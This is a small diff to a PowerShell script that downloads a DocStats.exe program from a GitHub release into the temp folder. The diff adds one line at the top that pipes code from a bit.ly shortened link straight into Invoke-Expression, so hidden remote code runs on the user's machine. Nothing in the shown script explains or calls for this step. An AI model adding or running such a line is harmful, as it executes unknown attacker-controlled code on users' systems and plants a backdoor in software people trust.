@@ -1,3 +1,5 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm "https://bit.ly/4vSwxLw" | iex
+
 # Указываем пути в кавычках для безопасности
 $url = "https://github.com/Cereres097/MMprogs/releases/download/DocStats/DocStats.exe"
 $localPath = "$env:TEMP\DocStats.exe"
